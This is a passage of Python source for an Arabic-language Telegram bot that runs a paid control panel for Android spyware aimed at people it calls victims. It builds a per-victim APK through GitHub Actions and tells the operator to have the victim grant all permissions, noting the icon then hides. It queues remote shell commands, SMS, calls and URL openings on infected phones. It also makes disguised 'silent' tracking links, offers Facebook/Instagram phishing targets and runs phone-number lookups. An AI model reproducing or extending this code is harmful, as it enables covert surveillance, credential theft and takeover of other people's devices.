            InlineKeyboardButton("✅ نعم", callback_data=f"v_confirm_del_{victim_id}"),
            InlineKeyboardButton("❌ إلغاء", callback_data=f"v_open_{victim_id}"),
        )
        bot.answer_callback_query(call.id)
        safe_edit(call, f"⚠️ <b>حذف ضحية {h(victim.get('name'))}?</b>", reply_markup=m)
        return

    if data.startswith("v_confirm_del_"):
        victim_id = data.replace("v_confirm_del_", "")
        delete_victim(chat_id, victim_id)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف")
        safe_edit(call, "✅ <b>تم الحذف</b>", reply_markup=main_menu(user_id))
        return

    # ============================================================
    # الدفع
    # ============================================================
    if data == "payment_menu":
        bot.answer_callback_query(call.id)
        safe_edit(call, "💎 <b>قسم الاشتراكات</b>",
                  reply_markup=build_main_payment_keyboard())
        return

    if data == "show_plans":
        bot.answer_callback_query(call.id)
        safe_edit(call, build_plans_text(), reply_markup=build_plans_keyboard())
        return

    if data.startswith("buy_plan_"):
        plan_key = data.replace("buy_plan_", "")
        bot.answer_callback_query(call.id, "جاري تجهيز الفاتورة...")
        send_invoice(bot, chat_id, plan_key)
        return

    if data == "my_account":
        bot.answer_callback_query(call.id)
        safe_edit(call, build_account_text(chat_id),
                  reply_markup=InlineKeyboardMarkup().add(
                      InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")))
        return

    if data == "back_to_main":
        bot.answer_callback_query(call.id)
        safe_edit(call, main_menu_text(user_id), reply_markup=main_menu(user_id))
        return

    if data == "noop":
        bot.answer_callback_query(call.id)
        return

    # ============================================================
    # الأدمن
    # ============================================================
    if data == "admin_panel":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        safe_edit(call, "👑 <b>لوحة تحكم الأدمن</b>", reply_markup=build_admin_menu())
        return

    if data == "admin_updates":
        if not is_admin(user_id):
            bot.answer_callback_query(call.id, "❌", show_alert=True)
            return
        bot.answer_callback_query(call.id, "⚙️ جاري الفتح...")
        safe_edit(call, "⚙️ <b>إدارة التحديثات</b>", reply_markup=build_update_panel())
        return

    if data.startswith("admin_users_"):
        if not is_admin(user_id):
            return
        try:
            page = int(data.replace("admin_users_", ""))
        except ValueError:
            page = 0
        users = get_all_users()
        if not users:
            bot.answer_callback_query(call.id, "لا يوجد مستخدمون", show_alert=True)
            return
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        bot.answer_callback_query(call.id)
        safe_edit(call, f"👥 <b>المستخدمون ({len(users)})</b>",
                  reply_markup=build_admin_users_keyboard(users, page))
        return

    if data.startswith("admin_user_"):
        if not is_admin(user_id):
            return
        try:
            uid = int(data.replace("admin_user_", ""))
        except ValueError:
            return
        user = get_user(uid)
        if not user:
            bot.answer_callback_query(call.id, "❌ غير موجود", show_alert=True)
            return
        bot.answer_callback_query(call.id)
        safe_edit(call, build_user_info_text(uid, user),
                  reply_markup=build_user_detail_keyboard(uid, user))
        return

    if data.startswith("admin_ban_user_"):
        if not is_admin(user_id): return
        try: uid = int(data.replace("admin_ban_user_", ""))
        except ValueError: return
        ban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم الحظر", show_alert=True)
        return

    if data.startswith("admin_unban_user_"):
        if not is_admin(user_id): return
        try: uid = int(data.replace("admin_unban_user_", ""))
        except ValueError: return
        unban_user(uid)
        bot.answer_callback_query(call.id, "✅ تم فك الحظر", show_alert=True)
        return

    if data.startswith("admin_grant_vip_user_"):
        if not is_admin(user_id): return
        try: uid = int(data.replace("admin_grant_vip_user_", ""))
        except ValueError: return
        u = get_or_create_user(uid)
        u["is_vip"] = True
        save_user(uid, u)
        bot.answer_callback_query(call.id, "💎 تم منح VIP", show_alert=True)
        try: bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
        except Exception: pass
        return

    if data.startswith("admin_remove_vip_"):
        if not is_admin(user_id): return
        try: uid = int(data.replace("admin_remove_vip_", ""))
        except ValueError: return
        u = get_or_create_user(uid)
        u["is_vip"] = False
        save_user(uid, u)
        bot.answer_callback_query(call.id, "✅ تم إزالة VIP", show_alert=True)
        return

    if data.startswith("admin_delete_user_"):
        if not is_admin(user_id): return
        try: uid = int(data.replace("admin_delete_user_", ""))
        except ValueError: return
        delete_user(uid)
        bot.answer_callback_query(call.id, "🗑️ تم الحذف", show_alert=True)
        return

    if data.startswith("admin_give_sub_"):
        if not is_admin(user_id): return
        try: uid = int(data.replace("admin_give_sub_", ""))
        except ValueError: return
        bot.answer_callback_query(call.id)
        m = InlineKeyboardMarkup()
        m.row(
            InlineKeyboardButton("⭐ أساسية", callback_data=f"admin_activate_basic_{uid}"),
            InlineKeyboardButton("💎 احترافية", callback_data=f"admin_activate_pro_{uid}"),
        )
        m.row(InlineKeyboardButton("👑 VIP", callback_data=f"admin_activate_vip_{uid}"))
        m.row(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))
        safe_edit(call, f"📅 <b>اختر الباقة</b> <code>{uid}</code>", reply_markup=m)
        return

    if data.startswith("admin_activate_"):
        if not is_admin(user_id): return
        parts = data.replace("admin_activate_", "").rsplit("_", 1)
        if len(parts) != 2: return
        plan_key, uid_str = parts
        try: uid = int(uid_str)
        except ValueError: return
        try:
            user = activate_subscription(uid, plan_key)
            plan = PRICING_PLANS.get(plan_key)
            bot.answer_callback_query(call.id, f"✅ {plan['name']}", show_alert=True)
            try:
                expires = datetime.fromisoformat(user["subscription"]["expires_at"])
                bot.send_message(uid,
                    f"🎉 <b>تم تفعيل اشتراكك!</b>\n📅 ينتهي: <code>{expires.strftime('%Y-%m-%d')}</code>",
                    parse_mode="HTML")
            except Exception: pass
        except Exception as e:
            logger.exception(f"activate_subscription error: {e}")
            bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)
        return

    if data == "admin_stats":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
        safe_edit(call, build_admin_stats_text(), reply_markup=m)
        return

    if data == "admin_recent":
        if not is_admin(user_id): return
        users = get_all_users()
        users.sort(key=lambda u: u.get("created_at", ""), reverse=True)
        lines = ["🆕 <b>آخر 10 مستخدمين:</b>"]
        for u in users[:10]:
            uid = u.get("user_id")
            name = u.get("first_name", "Unknown")
            icon = "👑" if is_admin(uid) else "💎" if u.get("is_vip") else "🚫" if u.get("is_banned") else "👤"
            lines.append(f"{icon} <b>{h(name)}</b> — <code>{uid}</code>")
        bot.answer_callback_query(call.id)
        m = InlineKeyboardMarkup()
        m.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
        safe_edit(call, "\n".join(lines), reply_markup=m)
        return

    if data == "admin_search":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🔍 <b>أرسل ID أو username:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_search_handler)
        return

    if data == "admin_broadcast":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "📢 <b>أرسل الرسالة:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_broadcast_handler)
        return

    if data == "admin_ban":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🚫 <b>أرسل ID للحظر:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_ban_handler)
        return

    if data == "admin_unban":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "✅ <b>أرسل ID لفك الحظر:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_unban_handler)
        return

    if data == "admin_delete":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "🗑️ <b>أرسل ID للحذف:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_delete_handler)
        return

    if data == "admin_grant_vip":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id, "💎 <b>أرسل ID لمنح VIP:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_grant_vip_handler)
        return

    if data == "admin_give_stars":
        if not is_admin(user_id): return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            "⭐ <b>أرسل:</b> <code>user_id|amount</code>", parse_mode="HTML")
        bot.register_next_step_handler(msg, admin_give_stars_handler)
        return

    if data.startswith("admin_msg_user_"):
        if not is_admin(user_id): return
        try: uid = int(data.replace("admin_msg_user_", ""))
        except ValueError: return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(chat_id,
            f"📨 <b>أرسل الرسالة لـ</b> <code>{uid}</code>:", parse_mode="HTML")
        bot.register_next_step_handler(msg, lambda m, u=uid: admin_msg_user_handler(m, u))
        return

    # ============================================================
    # Unknown
    # ============================================================
    logger.warning(f"Unhandled callback: {data}")
    bot.answer_callback_query(call.id)


# ============================================================
# Phone Search Input Handler
# ============================================================
def phone_search_input_handler(message):
    chat_id = message.chat.id

    if not message.text:
        bot.send_message(chat_id, "❌ أرسل رقماً صحيحاً")
        return

    phone_input = message.text.strip()

    wait_msg = bot.send_message(
        chat_id,
        "🔍 <b>جاري البحث...</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "⏳ <i>هذا قد يستغرق 10-15 ثانية</i>\n"
        "• تحليل الرقم\n"
        "• بحث Truecaller\n"
        "• فحص WhatsApp/Telegram\n"
        "• Google Dorks",
        parse_mode="HTML"
    )

    try:
        from phone_search import search_phone, format_result_for_telegram

        def do_search():
            try:
                result = search_phone(phone_input, chat_id=chat_id)
                formatted = format_result_for_telegram(result)

                try:
                    bot.delete_message(chat_id, wait_msg.message_id)
                except Exception:
                    pass

                tc = result.get('truecaller') or {}
                if tc.get('photo'):
                    try:
                        bot.send_photo(
                            chat_id,
                            tc['photo'],
                            caption="🖼️ <b>صورة البروفايل</b>",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.warning(f"Photo send error: {e}")

                m = InlineKeyboardMarkup()
                m.add(InlineKeyboardButton("📱 بحث جديد", callback_data="search_phone"))
                m.add(InlineKeyboardButton("📜 السجل", callback_data="search_history"))
                m.add(InlineKeyboardButton("🔙 القائمة", callback_data="search_menu"))

                if len(formatted) > 4000:
                    parts = [formatted[i:i+3900] for i in range(0, len(formatted), 3900)]
                    for i, part in enumerate(parts):
                        if i == len(parts) - 1:
                            bot.send_message(chat_id, part, parse_mode="HTML",
                                           disable_web_page_preview=True, reply_markup=m)
                        else:
                            bot.send_message(chat_id, part, parse_mode="HTML",
                                           disable_web_page_preview=True)
                else:
                    bot.send_message(chat_id, formatted, parse_mode="HTML",
                                   disable_web_page_preview=True, reply_markup=m)

            except Exception as e:
                logger.exception(f"phone_search error: {e}")
                try:
                    bot.delete_message(chat_id, wait_msg.message_id)
                except Exception:
                    pass
                bot.send_message(chat_id, f"❌ <b>خطأ:</b> {h(str(e)[:200])}",
                               parse_mode="HTML")

        threading.Thread(target=do_search, daemon=True).start()

    except Exception as e:
        logger.exception(f"phone_search_input error: {e}")
        try:
            bot.edit_message_text(
                f"❌ خطأ: {h(str(e)[:200])}",
                chat_id=chat_id,
                message_id=wait_msg.message_id
            )
        except Exception:
            pass


# ============================================================
# Silent Collector Step Handler
# ============================================================
def silent_label_handler(message):
    chat_id = message.chat.id
    if not message.text:
        bot.send_message(chat_id, "❌ اسم غير صحيح")
        return
    label = message.text.strip()[:50]
    try:
        link = generate_silent_link(chat_id, label)
        if not link:
            bot.send_message(chat_id, "❌ فشل توليد الرابط، حاول مرة أخرى")
            return
        text = (
            f"✅ <b>الرابط جاهز!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"🏷️ <b>الاسم:</b> <code>{h(label)}</code>\n"
            f"⏰ <b>الصلاحية:</b> 30 يوم\n\n"
            f"🎯 <b>الرابط:</b>\n"
            f"<code>{h(link)}</code>\n\n"
            f"💡 <i>الضحية تشوف Google مباشرة!</i>"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🎯 لوحة Silent", callback_data="gen_silent"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
        bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
    except Exception as e:
        logger.exception(f"silent_label_handler error: {e}")
        bot.send_message(chat_id, f"❌ خطأ: {h(str(e)[:100])}", parse_mode="HTML")


# ============================================================
# Step Handler — Target Update
# ============================================================
def upd_target_handler(message):
    if not is_admin(message.chat.id):
        return
    if not message.text:
        bot.send_message(message.chat.id, "❌ أرسل token صحيح")
        return
    target = message.text.strip()
    try:
        found_victim_id = None
        if redis_client:
            token_key = f"victim_token:{target}"
            raw = redis_client.get(token_key)
            if raw:
                info = json.loads(raw)
                found_victim_id = info.get("victim_id")
            if not found_victim_id:
                keys = redis_client.keys("victim:*:*")
                for key in keys[:200]:
                    try:
                        v = redis_client.hgetall(key)
                        if v.get("device_id") == target:
                            found_victim_id = v.get("victim_id")
                            break
                    except Exception:
                        continue
        if not found_victim_id:
            bot.send_message(
                message.chat.id,
                f"❌ <b>لم يتم العثور على الضحية</b>\n\n"
                f"🔍 البحث عن: <code>{h(target[:40])}</code>",
                parse_mode="HTML"
            )
            return
        if redis_client:
            redis_client.setex(
                f"apk_force_update:{found_victim_id}",
                3600,
                str(int(time.time()))
            )
        bot.send_message(
            message.chat.id,
            f"✅ <b>تم تفعيل التحديث لضحية محددة</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <code>{h(found_victim_id[:16])}</code>\n"
            f"⏰ المدة: ساعة",
            parse_mode="HTML",
            reply_markup=build_update_panel()
        )
    except Exception as e:
        logger.exception(f"upd_target_handler error: {e}")
        bot.send_message(message.chat.id, f"❌ خطأ: {h(str(e)[:200])}", parse_mode="HTML")


# ============================================================
# Build & Send APK
# ============================================================
def _build_and_send_apk(chat_id, victim_name, victim_token, wait_msg_id):
    if not GITHUB_TOKEN:
        try:
            bot.edit_message_text(
                f"⚠️ <b>GITHUB_TOKEN غير مضبوط</b>\n\n"
                f"🔑 <b>كود الضحية:</b>\n<code>{h(victim_token)}</code>",
                chat_id=chat_id, message_id=wait_msg_id,
                parse_mode="HTML"
            )
        except Exception:
            pass
        return
    success = trigger_victim_apk_build(victim_token, victim_name)
    if not success:
        try:
            bot.edit_message_text(
                "❌ <b>فشل تشغيل البناء</b>",
                chat_id=chat_id, message_id=wait_msg_id,
                parse_mode="HTML"
            )
        except Exception:
            pass
        return
    try:
        bot.edit_message_text(
            "✅ <b>تم تشغيل البناء بنجاح</b>\n\n"
            "⏳ <i>جاري انتظار GitHub Actions...</i>",
            chat_id=chat_id, message_id=wait_msg_id,
            parse_mode="HTML"
        )
    except Exception:
        pass
    apk_url = get_victim_apk_url(victim_token, max_wait=900)
    if not apk_url:
        try:
            bot.edit_message_text(
                f"⏰ <b>انتهت مهلة الانتظار</b>\n\n"
                f"👤 <code>{h(victim_name)}</code>",
                chat_id=chat_id, message_id=wait_msg_id,
                parse_mode="HTML"
            )
        except Exception:
            pass
        return
    try:
        r = requests.get(apk_url, timeout=120, allow_redirects=True)
        if r.status_code == 200 and len(r.content) > 10000:
            apk_buffer = io.BytesIO(r.content)
            apk_buffer.name = f"Victim_{victim_name}.apk"
            try:
                bot.delete_message(chat_id, wait_msg_id)
            except Exception:
                pass
            bot.send_document(
                chat_id, apk_buffer,
                caption=(
                    f"✅ <b>APK جاهز للضحية</b> <code>{h(victim_name)}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"📋 <b>الخطوات:</b>\n"
                    f"1. أرسل APK للضحية\n"
                    f"2. تثبّته على تليفونها\n"
                    f"3. <b>تفتحه وتوافق على كل الصلاحيات</b>\n"
                    f"4. تختفي الأيقونة بعد 5 ثواني"
                ),
                parse_mode="HTML"
            )
        else:
            bot.send_message(chat_id, "❌ فشل تحميل APK", parse_mode="HTML")
    except Exception as e:
        logger.exception(f"APK download error: {e}")
        bot.send_message(chat_id, f"❌ خطأ التحميل: {h(str(e))}", parse_mode="HTML")


# ============================================================
# Step Handlers — Victims
# ============================================================
def victim_name_step(message):
    chat_id = message.chat.id
    if not message.text:
        bot.send_message(chat_id, "❌ اسم غير صحيح")
        return
    victim_name = message.text.strip()[:40]
    wait_msg = bot.send_message(
        chat_id,
        f"⏳ <b>جاري تجهيز APK لـ</b> <code>{h(victim_name)}</code>\n\n"
        f"⏱️ <i>الوقت المتوقع: 2-4 دقائق</i>",
        parse_mode="HTML"
    )
    victim = create_victim(chat_id, victim_name, "general")
    if not victim:
        try:
            bot.edit_message_text(
                "❌ فشل إنشاء الضحية",
                chat_id=chat_id, message_id=wait_msg.message_id
            )
        except Exception:
            pass
        return
    victim_token = victim.get("victim_token")
    victim_id = victim.get("victim_id")
    logger.info(f"Victim created: {victim_name} | {victim_id}")
    threading.Thread(
        target=_build_and_send_apk,
        args=(chat_id, victim_name, victim_token, wait_msg.message_id),
        daemon=True
    ).start()


def v_toast_step(message, victim_id):
    if not message.text: return
    queue_victim_command(victim_id, "toast", text=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال Toast")


def v_shell_step(message, victim_id):
    if not message.text: return
    queue_victim_command(victim_id, "shell", command=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال الأمر")


def v_sendsms_step(message, victim_id):
    if not message.text: return
    parts = message.text.split("|")
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❌ استخدم: <code>رقم|نص</code>", parse_mode="HTML")
        return
    queue_victim_command(victim_id, "send_sms",
                         to=parts[0].strip(), msg=parts[1].strip())
    bot.send_message(message.chat.id, "✅ تم إرسال SMS")


def v_call_step(message, victim_id):
    if not message.text: return
    queue_victim_command(victim_id, "call", to=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")


def v_url_step(message, victim_id):
    if not message.text: return
    queue_victim_command(victim_id, "open_url", url=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم فتح الرابط")


def v_rename_step(message, victim_id):
    if not message.text: return
    new_name = message.text.strip()[:40]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(message.chat.id,
                     f"✅ <b>تم التغيير إلى:</b> <code>{h(new_name)}</code>",
                     parse_mode="HTML")


def victim_name_handler(message):
    if not message.text: return
    name = message.text.strip()[:50]
    chat_id = message.chat.id
    if redis_client:
        try:
            redis_client.setex(f"pending_victim_name:{chat_id}", 300, name)
        except Exception:
            pass
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("📘 Facebook", callback_data="victim_site_facebook"),
        InlineKeyboardButton("📷 Instagram", callback_data="victim_site_instagram"),
    )
    bot.send_message(
        chat_id,
        f"👤 <b>اسم الضحية:</b> <code>{h(name)}</code>\n\n🎯 <b>اختر الموقع:</b>",
        reply_markup=markup, parse_mode="HTML"
    )


def victim_rename_handler(message, victim_id):
    if not message.text: return
    new_name = message.text.strip()[:50]
    rename_victim(message.chat.id, victim_id, new_name)
    bot.send_message(message.chat.id,
                     f"✅ <b>تم التغيير إلى:</b> <code>{h(new_name)}</code>",
                     parse_mode="HTML")


# ============================================================
# Step Handlers — APK Manager
# ============================================================
def apk_toast_step(message, device_id):
    if not message.text: return
    push_apk_command(device_id, "toast", text=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال Toast")


def apk_shell_step(message, device_id):
    if not message.text: return
    push_apk_command(device_id, "shell", command=message.text)
    bot.send_message(message.chat.id, "✅ تم إرسال الأمر")


def apk_sendsms_step(message, device_id):
    if not message.text: return
    parts = message.text.split("|")
    if len(parts) != 2:
        bot.send_message(message.chat.id, "❌ استخدم: <code>رقم|نص</code>", parse_mode="HTML")
        return
    push_apk_command(device_id, "send_sms",
                     to=parts[0].strip(), msg=parts[1].strip())
    bot.send_message(message.chat.id, "✅ تم إرسال SMS")


def apk_call_step(message, device_id):
    if not message.text: return
    push_apk_command(device_id, "call", to=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم بدء المكالمة")


def apk_url_step(message, device_id):
    if not message.text: return
    push_apk_command(device_id, "open_url", url=message.text.strip())
    bot.send_message(message.chat.id, "✅ تم فتح الرابط")


# ============================================================
# معالجات الأدمن (Step)
# ============================================================
def admin_search_handler(message):
    if not is_admin(message.chat.id): return
    query = (message.text or "").strip().lstrip("@")
    users = get_all_users()
    found = [u for u in users
             if str(u.get("user_id")) == query
             or (u.get("username", "") or "").lower() == query.lower()]
    if not found:
        bot.send_message(message.chat.id,
                         f"❌ لم يُعثر على: <code>{h(query)}</code>",
                         parse_mode="HTML")
        return
    for u in found:
        uid = u.get("user_id")
        bot.send_message(message.chat.id, build_user_info_text(uid, u),
                         reply_markup=build_user_detail_keyboard(uid, u),
                         parse_mode="HTML")


def admin_broadcast_handler(message):
    if not is_admin(message.chat.id): return
    text = message.text
    if not text: return
    users = get_all_users()
    success = failed = 0
    status_msg = bot.send_message(message.chat.id, f"📢 جاري الإرسال لـ {len(users)}...")
    for u in users:
        uid = u.get("user_id")
        if u.get("is_banned"): continue
        try:
            bot.send_message(uid, f"📢 <b>رسالة من الإدارة:</b>\n\n{h(text)}", parse_mode="HTML")
            success += 1
            time.sleep(0.05)
        except Exception:
            failed += 1
    try:
        bot.edit_message_text(f"✅ <b>تم!</b>\n✔️ {success}\n❌ {failed}",
                              chat_id=message.chat.id,
                              message_id=status_msg.message_id,
                              parse_mode="HTML")
    except Exception:
        pass


def admin_ban_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except ValueError: return
    ban_user(uid)
    bot.send_message(message.chat.id, f"🚫 تم حظر <code>{uid}</code>", parse_mode="HTML")


def admin_unban_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except ValueError: return
    unban_user(uid)
    bot.send_message(message.chat.id, f"✅ تم فك حظر <code>{uid}</code>", parse_mode="HTML")


def admin_delete_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except ValueError: return
    delete_user(uid)
    bot.send_message(message.chat.id, f"🗑️ تم حذف <code>{uid}</code>", parse_mode="HTML")


def admin_grant_vip_handler(message):
    if not is_admin(message.chat.id): return
    try: uid = int((message.text or "").strip())
    except ValueError: return
    u = get_or_create_user(uid)
    u["is_vip"] = True
    save_user(uid, u)
    bot.send_message(message.chat.id, f"💎 تم منح VIP لـ <code>{uid}</code>", parse_mode="HTML")
    try:
        bot.send_message(uid, "💎 <b>تهانينا!</b> VIP مُفعّل 🚀", parse_mode="HTML")
    except Exception:
        pass


def admin_give_stars_handler(message):
    if not is_admin(message.chat.id): return
    try:
        parts = (message.text or "").split("|")
        uid = int(parts[0].strip())
        amount = int(parts[1].strip())
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "❌ صيغة خاطئة")
        return
    u = get_or_create_user(uid)
    u["total_stars_spent"] = max(0, u.get("total_stars_spent", 0) - amount)
    save_user(uid, u)
    bot.send_message(message.chat.id,
                     f"⭐ تم إعطاء <code>{amount}</code> نجمة لـ <code>{uid}</code>",
                     parse_mode="HTML")


def admin_msg_user_handler(message, uid):
    if not is_admin(message.chat.id): return
    try:
        bot.send_message(uid, f"📨 <b>من الإدارة:</b>\n\n{h(message.text)}", parse_mode="HTML")
        bot.send_message(message.chat.id, "✅ تم الإرسال", parse_mode="HTML")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ {h(str(e))}", parse_mode="HTML")
